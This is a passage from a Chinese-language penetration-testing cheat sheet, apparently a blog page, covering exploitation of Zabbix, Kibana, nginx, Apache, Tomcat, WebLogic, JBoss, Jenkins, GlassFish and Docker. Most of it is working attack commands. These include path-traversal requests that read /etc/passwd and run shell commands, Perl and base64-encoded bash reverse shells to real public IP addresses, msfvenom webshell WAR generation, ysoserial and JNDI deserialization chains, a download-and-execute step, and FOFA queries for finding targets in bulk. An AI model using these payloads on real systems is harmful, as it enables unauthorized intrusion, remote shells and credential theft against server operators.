class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span> Welcome to xiaodi! <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;height:1px;width:1px;&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&#x27;teamviewer10: --play \\\\attacker-IP\\share\\fake.tvs&#x27;</span> &gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"zabbix-未授权-rce\"><a class=\"markdownIt-Anchor\" href=\"#zabbix-未授权-rce\">#</a> zabbix 未授权 rce</h4>\n<p>Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。是一款服务器监控软件，其由 server、agent、web 等模块组 成，其中 web 模块由 PHP 编写，用来显示数据库中的结果。默认端口：10051。</p>\n<p>漏洞复现 fofa 关键字:app=“ZABBIX - 监控系统” &amp;&amp; body=“saml”</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击脚本:https://github.com/L0ading-x/cve-2022-23131</span> </span><br><span class=\"line\">python3 cve-2022-23131.py http://127.0.0.1 Admin</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将生成的 zbx_signed_session 替换到当前目标的 cookie 中，点击登陆页面的 sign <span class=\"keyword\">in</span> with Single Sign-On (SAML)方式登陆，即可直接进入管理界面!</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">手动复现：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">捕获的原来的cookie的值如下</span></span><br><span class=\"line\">zbx_session=eyJzZXNzaW9uaWQiOiJlNWNjNjc2ZWUzNDRlNGU4ZWIzNxxxxsIxxxxxxxx xMa1lYYXBucWp0RXpMdTFmTVJPcTArOGtxbkFLemdIMTdxUlY1VnErSkpKUGVaZHE3 WG02aGtQd1wvWUxycDgrYXgzbEQ4RjF6ajlRVENHelE9PSJ9</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进行base 64 解码后的结果为</span></span><br><span class=\"line\">&#123;&quot;sessionid&quot;:&quot;e5cc676ee3xxe8eb3790b521&quot;,&quot;sign&quot;:&quot;9Fv7yJLkYXapnqjtEzLu1fMROq0+8kqnAKzgH17qRV5Vxxx7Xm6hkPw\\/YLrp8+ax3lD8F1zj9QTCGzQ==&quot;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加Admin用户到cookie中</span></span><br><span class=\"line\">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&#123;&quot;sessionid&quot;:&quot;e5cc6xxxx4e4e8eb3790b521&quot;,&quot;sign&quot;:&quot;9Fv7yJLkYXapnqjtEzLu1fMRxxxZdq7Xm6hkPw\\/YLrp8+ax3lD8F1zj9QTCGzQ==&quot;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">再次编码后伪造cookie发送</span></span><br><span class=\"line\">eyJzYW1sX2RhdGEiOnsidxxxxjoiQWRtaW4ifSx7InNlc3Npb25pZCI6ImU1Y2M2NzZlZTM 0MDQ4NDM2NGU0ZThlYjM3OTBiNTIxIiwic2lnbiI6IjlGdjd5SkxrWVhhcG5xanRFekx1M WZNUk9xMCs4a3FuQUt6Z0gxN3FSVjVWcStKSkpQZVpkcTdYbTZoa1B3XC9ZTHJwOCt heDNsRDhGMXpqOVFUQ0d6UT09In0=</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">zabbix可以写入一些script脚本并且执行此脚本的操作的，从后台的未授权直接突破到服务器的权限，再根据服务器的漏洞进行提权</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"kibana-任意代码执行\"><a class=\"markdownIt-Anchor\" href=\"#kibana-任意代码执行\">#</a> Kibana 任意代码执行</h4>\n<p>Kibana 为 Elassticsearch 设计的一款开源的视图工具。其 5.6.15 和 6.6.1 之前 的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代码。默认端口：5601</p>\n<p>攻击脚本:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L0NWRS0yMDE5LTc2MDk=\">https://github.com/LandGrey/CVE-2019-7609</span><br>\n 复现链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIva2liYW5hL0NWRS0yMDE5LTc2MDkvUkVBRE1FLnpoLWNuLm1k\">https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2019-7609/README.zh-cn.md</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">原型链污染发生在“Timeline”页面，我们填入如下 Payload:</span></span><br><span class=\"line\">.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;/bin/touch /tmp/success&quot;);process.exit()//&#x27;)</span><br><span class=\"line\">.props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">成功后再访问“Canvas”页面触发命令/bin/touch /tmp/success，文件成功创建</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可以配合py脚本和Fofaviewer批量搜索目标测试漏洞：</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"中间件安全\"><a class=\"markdownIt-Anchor\" href=\"#中间件安全\">#</a> 中间件安全</h3>\n<h4 id=\"nginx-文件解析\"><a class=\"markdownIt-Anchor\" href=\"#nginx-文件解析\">#</a> nginx 文件解析</h4>\n<p>配置文件错误导致解析漏洞，对于任意文件名，在后面添加 /xxx.php (xxx 为任意字符) 后，即可将文件作为 php 解析。如 info.jpg 后面加上 /xxx.php，会将 info.jpg 以 php 解析。</p>\n<p>复现链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L25naW54X3BhcnNpbmdfdnVsbmVyYWJpbGl0eS8=\">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</span></p>\n<p>CVE-2013-4547:<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L0NWRS0yMDEzLTQ1NDcv\">https://vulhub.org/#/environments/nginx/CVE-2013-4547/</span><br>\nCVE-2013-4547 文件名逻辑漏洞，影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7。抓包，修改为 info.jpg…php, 在 Hex 选修卡中将 jpg 后面的两个点 2e 改成<br>\n 20,00。寻找上传点，并且确定版本合适可测试该漏洞。</p>\n<p>CVE_2021_23017 无 EXP，没有可以直接拿权限的代码</p>\n<p>CVE_2017_7529 信息泄漏意义不大</p>\n<h4 id=\"apache-文件解析-rce\"><a class=\"markdownIt-Anchor\" href=\"#apache-文件解析-rce\">#</a> apache 文件解析 rce</h4>\n<p>(1)CVE-2021-41773</p>\n<p>Apache HTTP Server 目录遍历漏洞 CVE-2021-41773，影响版本：Apache HTTP Server 2.4.49，该漏洞是由于 Apache HTTP Server 2.4.49 版本存在目录穿 越漏洞，攻击者利用该漏洞在未授权的情况下，访问服务器未在 httpd 配置文件中标记为拒绝请求的文件内容，进而导致敏感信息泄露。</p>\n<p>漏洞链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI5MzE3Mi5odG1s\">https://www.freebuf.com/articles/web/293172.html</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">访问并下载</span></span><br><span class=\"line\">curl -s --path-as-is &quot;http://ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;</span><br><span class=\"line\">curl -s --path-as-is -d &#x27;echo Content-Type: text/plain; echo;whoami&#x27; &quot;http://ip:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&quot;</span><br><span class=\"line\">curl -s --path-as-is -d &#x27;echo Content-Type: text/plain; echo;perl -e &#x27;use</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">此为perl语言生成的反弹shell命令，可通过棱角社区直接生成</span></span><br><span class=\"line\">Socket;$i=&quot;47.94.236.117&quot;;$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;</span><br></pre></td></tr></table></figure>\n<p>（2）CVE-2021-42013</p>\n<p>Apache HTTP Server 目录遍历漏洞 CVE-2021-42013 影响版本：Apache HTTP</p>\n<p>Server 2.4.50 &amp; Apache HTTP Server 2.4.49，该漏洞是由于在 Apache HTTP Server 2.4.50 版本中对 CVE-2021-41773 修复不够完善，攻击者可利用该漏洞绕过修复 补丁，并利用目录穿越攻击访问服务器中一些文件，进而造成敏感信息泄露。 若 httpd 中开启 CGI 功能，攻击者可以构造恶意请求，造成远程代码执行。</p>\n<p>参考地址：# <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzMwNjU0Ny9hcnRpY2xlL2RldGFpbHMvMTIyMjkxNTYy\">https://blog.csdn.net/weixin_47306547/article/details/122291562</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工具地址：https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</span></span><br><span class=\"line\">curl -v --path-as-is [http://IP:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%6](http://IP:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%6)5/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br><span class=\"line\">curl -v --data &quot;echo;id&quot; &#x27;http://IP:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CVE-2021-41773 cve-2021-42013 的主要区别把 /%2e/换成了/.%%32%65/从而绕过了Apache HTTP Server 2.4.50 的补丁</span></span><br></pre></td></tr></table></figure>\n<p>（3）CVE-2017-15715</p>\n<p>apache CVE-2017-15715 文件解析：Apache HTTPD 是一款 HTTP 服务器。 其 2.4.0~2.4.29 版本存在一个解析漏洞，在解析 PHP 时，1.php\\x0A 将被按照<br>\n PHP 后缀进行解析，导致绕过一些服务器的安全策略。</p>\n<p>漏洞链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2h0dHBkL0NWRS0yMDE3LTE1NzE1Lw==\">https://vulhub.org/#/environments/httpd/CVE-2017-15715/</span></p>\n<p>在 1.php 后面插入一个 \\x0A (注意，不能是 \\x0D\\x0A，只能是一个 \\x0A)，不再拦截访问刚才上传的 / 1.php%0a，发现能够成功解析，但这个文件不是 php 后缀，说明目标存<br>\n在解析漏洞</p>\n<p>（4）其他 cve</p>\n<p>此外还有 cve_2017_9798 价值不高、cve_2018_11759 价值不高等与权限无关的漏洞、cve_2021_37580 插件问题。有的 apache 和其他组件配合使用，是存在一些漏洞的，甚至可以命令执行，但是需要看当前配合的组件时哪些。</p>\n<h4 id=\"tomcat弱口令-上传-包含\"><a class=\"markdownIt-Anchor\" href=\"#tomcat弱口令-上传-包含\">#</a> tomcat 弱口令 上传 包含</h4>\n<p>（1）弱口令猜解</p>\n<p>配置不当导致后台弱口令，可通过上传 jsp 压缩包改名的 war 拿 shell；tomcat 的 manager 页面存在弱口令，可用 msf 尝试爆破</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class=\"line\">set RHOSTS 192.168.31.109</span><br><span class=\"line\">使用 msf 生成一个反弹 shell 的 war 文件木马</span><br><span class=\"line\">msfvenom -p java/jsp_shell_reverse_tcp LHOST= 192.168.31.135 LPORT= 4444 -f war -o revshell.war</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者可以利用哥斯拉生成jsp的java木马，在压缩成zip最后改名为war后缀</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/BeichenDream/Godzilla</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上传到tomcat后台并且访问上传的内容即可</span></span><br></pre></td></tr></table></figure>\n<p>（2）PUT 方法任意写文件漏洞</p>\n<p>Tomcat 版本 8.5.19 存在 PUT 方法任意写文件漏洞（CVE-2017-12615 ）。准备好木马文件 ice.jsp，利用 curl 命令用 PUT 方法往 1 .jsp/ 发送恶意木马文件，可得到 webshell。</p>\n<p>漏洞链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvdG9tY2F0L0NWRS0yMDE3\">https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017</span> -12615/README.zh-cn.md</p>\n<p><code>curl -v http://110.42.178.227:8080/1.jsp/ -X PUT -d @ice.jsp</code></p>\n<p>或者通过 burp 改数据包，修改方法为 PUT，访问地址为 1.jsp/，并上传木马</p>\n<p>（3）文件包含漏洞</p>\n<p>Aapache Tomcat AJP 文件包含漏洞 (CVE-2020-1938) 由于 Tomcat AJP 协 议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。 此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远 程代码执行的危害。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载利用代码 (Tomcat 9.0.30)</span></span><br><span class=\"line\">wget https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/archive/refs/heads/master.zip</span><br><span class=\"line\">unzip master.zip</span><br><span class=\"line\">cd CNVD-2020-10487-Tomcat-Ajp-lfi-master</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接用脚本读取敏感文件</span></span><br><span class=\"line\">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 110.42.178.227</span><br></pre></td></tr></table></figure>\n<h4 id=\"weblogic-加载ldap\"><a class=\"markdownIt-Anchor\" href=\"#weblogic-加载ldap\">#</a> weblogic 加载 ldap</h4>\n<p>探针默认端口：7001，Weblogic 是 Oracle 公司推出的 J2EE 应用服务器。 cve_2017_3506 工具、cve_2018_2893 工具、cve_2018_3245 工具、cve_2020_1<br>\n4882 工具、cve_2021_2394 反序列化。<br>\n<strong>安全圈小王子工具 (GUI_Tools V1.1) 一把梭</strong></p>\n<ul>\n<li>CVE-2021-2394</li>\n</ul>\n<p>攻击者可以在未授权的情况下通过 IIOP、T3 协议对存在漏洞的 WebLogic Server 组件进行攻击，成功利用该漏洞的攻击者可以接管 WebLogic Server。 这是一个二次反序列化漏洞，是 CVE-2020-14756 和 CVE-2020-14825 的调用链相 结合组成一条新的调用链来绕过 weblogic 黑名单列表。</p>\n<p>漏洞链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzMwNjE5L2FydGljbGUvZGV0YWlscy8xMjAyNTQxMjQ=\">https://blog.csdn.net/m0_51330619/article/details/120254124</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在一台公网服务器上依次执行以下命令，生成ldap并监听端口</span></span><br><span class=\"line\">wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注意反弹shell的代码需要进行编码</span></span><br><span class=\"line\">echo &quot;bash -i &gt;&amp; /dev/tcp/1.117.52.219/4444 0&gt;&amp;1&quot; | base64</span><br><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41Mi4yMTkvNDQ0NCAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 1.117.52.219</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用CVE_2021_2394攻击目标weblogic并加载远程ldap</span></span><br><span class=\"line\">wget https://github.com/lz2y/CVE-2021-2394/releases/download/2.0/CVE_2021_2394_jar.zip</span><br><span class=\"line\">java -jar CVE_2021_2394.jar 110.42.178.227 7001 ldap://1.117.52.219:1389/4ikzlu</span><br></pre></td></tr></table></figure>\n<h4 id=\"jboss-弱口令-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#jboss-弱口令-反序列化\">#</a> jboss 弱口令 反序列化</h4>\n<ul>\n<li>CVE-2017-12149</li>\n</ul>\n<p>Jboss 通常占用的端口是 1098，1099，4444，4445，8080，8009，8083， 8093，Red Hat JBoss Application Server 是一款基于 JavaEE 的开源应用服务器。<br>\n在一些 jboss 管理平台上，存在弱口令，可以尝试猜解密码或未授权。</p>\n<p>漏洞链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvamJvc3MvQ1ZFLTIwMTctMTIxNDk=\">https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">我们使用bash来反弹shell，但由于Runtime.getRuntime().<span class=\"built_in\">exec</span>()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</span></span><br><span class=\"line\">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTc4LjIyNy8zNDUxMiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly</span></span><br><span class=\"line\">curl http://110.42.178.227:8080/invoker/readonly --data-binary @poc.ser</span><br></pre></td></tr></table></figure>\n<ul>\n<li>CVE-2017-7504</li>\n</ul>\n<p>漏洞复现过程与上差不多，唯一区别在于数据发送地址</p>\n<p><code>curl http://47.94.236.117:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser</code></p>\n<h4 id=\"jenkins-相关漏洞\"><a class=\"markdownIt-Anchor\" href=\"#jenkins-相关漏洞\">#</a> Jenkins 相关漏洞</h4>\n<p>探针默认端口: 8080 ，Jenkins 是一个开源软件项目，是基于 Java 开发的一种持续集成工具，用于监控持续重复的工作。</p>\n<p>（1）cve_2017_1000353</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用条件未知，即便是JDK-1.8.0_291 版本也失效了</span></span><br><span class=\"line\">wget https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar</span><br><span class=\"line\">java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTc4LjIyNy8zNDUxMiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">wget https://github.com/vulhub/CVE-2017-1000353/archive/refs/heads/master.zip</span><br><span class=\"line\">python exploit.py http://110.42.178.227:8080 jenkins_poc.ser</span><br></pre></td></tr></table></figure>\n<p>（2）CVE-2018-1000861</p>\n<p>漏洞链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FkYW15b3JkYW4vY3ZlLTIwMTktMTAwMzAwMC1qZW5raW5zLXJjZS1wb2M=\">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; /tmp/1.txt &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/1.117.52.219/4444 0&gt;&amp;1</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\">python3 -m http.server 1389</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用脚本poc在vulhub靶场自带的启动环境中就有</span></span><br><span class=\"line\">python2 poc.py http://110.42.178.227:8080/ &quot;curl -o /tmp/1.sh http://1.117.52.219: 1389 / 1 .txt&quot;</span><br><span class=\"line\">python2 poc.py http://110.42.178.227:8080/ &quot;bash /tmp/1.sh&quot;</span><br></pre></td></tr></table></figure>\n<p>（3）CVE_2019_100300</p>\n<p>漏洞链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FkYW15b3JkYW4vY3ZlLTIwMTktMTAwMzAwMC1qZW5raW5zLXJjZS1wb2M=\">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span></p>\n<p>需要用户帐号密码，可以进行用户名枚举与爆破的方法测试</p>\n<h4 id=\"glassfish-弱口令-信息泄露\"><a class=\"markdownIt-Anchor\" href=\"#glassfish-弱口令-信息泄露\">#</a> glassfish 弱口令 信息泄露</h4>\n<p>探针默认端口：4848，GlassFish 是一款强健的商业兼容应用服务器</p>\n<p>CVE-2017-1000028: 可以获取到后台密码以及主机上的文件内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">读密码</span></span><br><span class=\"line\"><span class=\"meta prompt_\">/theme/METAINF/%</span><span class=\"language-bash\">c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">读windows文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\">/theme/META-INF/prototype%</span><span class=\"language-bash\">c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c 0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">读linux文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\">/theme/META-INF/%</span><span class=\"language-bash\">c0%ae%c0%ae/%c0%ae%c0%ae/%c0%a e%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c 0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"docker-逃逸\"><a class=\"markdownIt-Anchor\" href=\"#docker-逃逸\">#</a> docker 逃逸</h4>\n<p>Docker 容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利 用某种手段，再结合执行 POC 或 EXP，就可以返回一个宿主机的高权限 Shell， 并拿到宿主机的 root 权限。它从容器中逃了出来，因此我们形象的称为 Docker 逃逸漏洞。</p>\n<p>判断当前是在 docker 还是在宿主机上：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> 如果是在docker内部会有信息返回，否则提示没有此文件夹及文件</span></span><br><span class=\"line\">ls -alh /.dockerenv</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在docker内部显示的内容比较多，否则显示的内容比较少</span></span><br><span class=\"line\">cat /proc/1/cgroup </span><br></pre></td></tr></table></figure>\n<p>docker daemon api 未授权访问漏洞:</p>\n<p>漏洞链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvZG9ja2VyL3VuYXV0aG9yaXplZC1yY2UvUkVBRE1FLnpoLWNuLm1k\">https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md</span></p>\n<p>利用方法是，我们随意启动一个容器， 并将宿主机的 /etc 目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 